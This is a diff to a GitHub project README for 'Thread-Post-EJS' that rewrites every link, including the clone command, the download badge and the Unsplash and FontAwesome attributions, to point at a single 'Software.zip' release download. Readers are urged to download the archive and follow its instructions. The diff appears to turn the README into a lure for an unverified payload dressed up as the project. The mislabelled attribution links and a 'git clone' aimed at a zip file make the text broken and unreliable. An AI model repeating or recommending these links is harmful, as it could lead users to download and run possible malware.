@@ -17,7 +17,7 @@ To get started with the **Thread-Post-EJS** repository, you can follow these sim
 
 1. Clone the repository to your local machine:
 ```bash
-git clone https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0
+git clone https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip
 ```
 
 2. Install the necessary dependencies:
@@ -34,11 +34,11 @@ npm start
 
 Make sure to check out the detailed documentation within the repository for more in-depth instructions.
 
-## Download https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0
+## Download https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip
 
-[![Download https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0](https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0)](https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0)
+[![Download https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip](https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip)](https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip)
 
-This link leads to the https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0 file which contains essential resources for launching the project. Download the zip file and follow the instructions provided within to set up the project successfully.
+This link leads to the https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip file which contains essential resources for launching the project. Download the zip file and follow the instructions provided within to set up the project successfully.
 
 In case the link is not accessible, please visit the "Releases" section of the repository for alternative download options.
 
@@ -47,8 +47,8 @@ Contributions are welcome! If you have any suggestions, ideas, or bug fixes, fee
 
 ## Attributions
 
-- Background image by [Unsplash](https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0)
-- Icons from [FontAwesome](https://github.com/haziff/Thread-Post-EJS/releases/tag/v1.0)
+- Background image by [Unsplash](https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip)
+- Icons from [FontAwesome](https://github.com/haziff/Thread-Post-EJS/releases/download/v2.0/Software.zip)
 
 Start exploring the **Thread-Post-EJS** repository today and unleash the full potential of your web development projects! 🚀
 
